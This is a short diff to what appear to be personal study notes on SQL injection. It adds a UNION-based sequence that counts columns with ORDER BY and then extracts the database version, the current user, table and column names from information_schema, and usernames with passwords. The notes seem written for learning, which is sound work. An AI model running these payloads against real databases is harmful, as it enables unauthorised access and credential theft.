@@ -7,5 +7,11 @@
 .
 .
 .
-> select * from <tablename> where username="test" password="any" order by 6; [// ERROR COUGHT- no of columns ou to bounds]
+> select * from <tablename> where username="test" and password="any" order by 6; [// ERROR COUGHT- no of columns ou to bounds. We now kow the no of columns]
 > select * from <tablename>;[// we have 5 columns]
+> select * from <tablename> where username="test" and password="any" union select 1,2,3,@@version,5;
+-----interesting result------
+> select * from <tablename> where username="test" union select 1,2,3,user(),5;
+> select * from <tablename> where username="test" union select 1,2,3,table_name,5 from information_schema.tables;
+> select * from <tablename> where username="test" union select 1,2,3,column_name,5 from information_schema.columns;
+> select * from <tablename> where username="test" union select 1,2,username,password,5 from <tablename>;
